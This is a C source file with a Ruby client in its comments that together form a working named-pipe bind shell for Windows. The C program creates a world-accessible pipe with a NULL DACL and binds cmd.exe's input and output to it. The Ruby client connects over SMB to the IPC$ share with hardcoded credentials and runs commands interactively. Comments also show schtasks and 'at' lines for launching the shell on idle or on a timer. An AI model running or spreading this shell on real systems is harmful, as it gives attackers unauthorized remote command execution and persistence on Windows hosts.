#include<windows.h>

//schtasks / create / tn bla / tr c : \Users\bob.win7Pro64\Desktop\pipe.exe / sc onidle / i 1
//schtasks / query / tn bla
//schtasks / run / tn bla
//>set /a min=%time:~3,2%+2 && at %time:~0,3%%min% c:\Users\mee\Desktop\VS\pipe\Debug\pipe.exe
int main(){
	HANDLE hPipe = 0;
	CHAR* pipe = "\\\\.\\pipe\\pipeShell";
	//create security descriptor with NULL DACL(so anyone can read the pipe)
	SECURITY_DESCRIPTOR sd;
	if (!InitializeSecurityDescriptor(&sd, 1)) 
		printf("InitializeSecurityDescriptor fail: %i\n", GetLastError());
	if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE)) 
		printf("SetSecurityDescriptorDacl fail: %i\n", GetLastError());
	//create descuroty dwcriptor that allow objects tobe inherit
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;	//make inheritable so cmd.exe can access
	sa.lpSecurityDescriptor = &sd;

	hPipe = CreateNamedPipeA(
		pipe, 
		PIPE_ACCESS_DUPLEX, 
		PIPE_TYPE_BYTE | PIPE_WAIT, 
		PIPE_UNLIMITED_INSTANCES, 
		0xffff,
		0xffff, NMPWAIT_USE_DEFAULT_WAIT, &sa
		);

	//setup/create cmd.exe process
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = hPipe;				//redirect cmd.exe stdin to inr
	si.hStdOutput = hPipe;				//redirect cmd.exe std out/err to outw
	si.hStdError = hPipe;
	CHAR* app = "C:\\Windows\\system32\\cmd.exe";

	if (!CreateProcessA(app, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		printf("CreateProcessA: %i\n", GetLastError());

	//wait for client to connect to namepipe
	if (!ConnectNamedPipe(hPipe, NULL)) printf("connectNamepipe piper fail: %i\n", GetLastError());

	return 0;
}
/*
#client to go with it :)
#!/usr/bin/ruby
require"socket"
require"ruby_smb"

ip = "10.1.1.9"
port = 445
user = "seperUser"
pass = "superSecretSauce"
pipe = "pipeShell"

sock = TCPSocket.open(ip, port)
dispatcher = RubySMB::Dispatcher::Socket.new(sock)
smb = RubySMB::Client.new(dispatcher, smb1: true, smb2: true, username: user, password: pass)
result = smb.login.value
error = WindowsError::NTStatus.find_by_retval(result.to_i)[0]
result == 0? result : (raise "Connect Fail, WinError: %s %s"%[error.name, error.description])
ipc = smb.tree_connect("\\\\#{ip}\\IPC$")

pipeShell = ipc.open_file(filename: pipe, read: true, write: true)

loop do
  begin
    print pipeShell.read(bytes:0xffff), " "
    cmd = gets.chomp
    break if cmd == "exit"
    pipeShell.write(data:"#{cmd}\n")
  rescue SignalException => e
    puts""
    break
  end
end

pipeShell.close
*/
